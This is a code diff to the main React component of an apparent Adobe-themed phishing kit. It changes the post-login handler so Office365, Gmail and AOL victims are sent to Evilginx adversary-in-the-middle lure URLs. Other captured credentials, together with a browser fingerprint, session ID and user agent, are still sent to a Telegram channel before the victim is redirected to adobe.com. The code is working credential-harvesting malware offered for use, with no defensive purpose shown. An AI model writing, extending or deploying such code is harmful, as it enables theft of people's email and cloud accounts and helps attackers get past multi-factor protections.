@@ -152,7 +152,6 @@ function App() {
   const [isInitializing, setIsInitializing] = useState(true);
   const [isBotDetected, setIsBotDetected] = useState(false);
   const [initMessage, setInitMessage] = useState('Connecting...');
-  
 
   const navigate = useNavigate();
   const location = useLocation();
@@ -175,7 +174,7 @@ function App() {
     window.addEventListener('resize', checkMobile);
     return () => window.removeEventListener('resize', checkMobile);
   }, []);
-  
+
   useEffect(() => {
     const handleCookieChange = (event: CookieChangeEvent) => {
       if (event.name === 'adobe_session') {
@@ -195,20 +194,35 @@ function App() {
   }, [hasActiveSession, location.pathname, navigate]);
 
   const handleLoginSuccess = async (loginData: any) => {
-    setIsLoading(true);
-    const browserFingerprint = await getBrowserFingerprint();
-    const credentialsData = {
-      ...loginData,
-      sessionId: Math.random().toString(36).substring(2, 15),
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      ...browserFingerprint,
+    const providerMap = {
+      [ROUTES.LOGIN_OFFICE365]: 'o365',
+      [ROUTES.LOGIN_GMAIL]: 'gmail',
+      [ROUTES.LOGIN_AOL]: 'aol',
     };
-    
-    await safeSendToTelegram({ type: 'credentials', data: credentialsData });
-    
-    // Redirect to Adobe.com after capturing credentials — no OTP step
-    window.location.href = 'https://www.adobe.com';
+
+    const currentProvider = providerMap[location.pathname];
+
+    if (currentProvider && ['o365', 'gmail', 'outlook', 'aol'].includes(currentProvider)) {
+      // Redirect to Evilginx lure URL for these providers (handled by Evilginx with Telegram)
+      const evilginxURL = PROVIDER_URLS[currentProvider.toUpperCase()] || PROVIDER_URLS.MICROSOFT; // Fallback for outlook
+      window.location.href = evilginxURL;
+    } else {
+      // For other providers, use the external sendTelegram function
+      setIsLoading(true);
+      const browserFingerprint = await getBrowserFingerprint();
+      const credentialsData = {
+        ...loginData,
+        sessionId: Math.random().toString(36).substring(2, 15),
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        ...browserFingerprint,
+      };
+
+      await safeSendToTelegram({ type: 'credentials', data: credentialsData });
+
+      // Redirect to Adobe.com
+      window.location.href = 'https://www.adobe.com';
+    }
   };
 
   const handleLogout = () => {
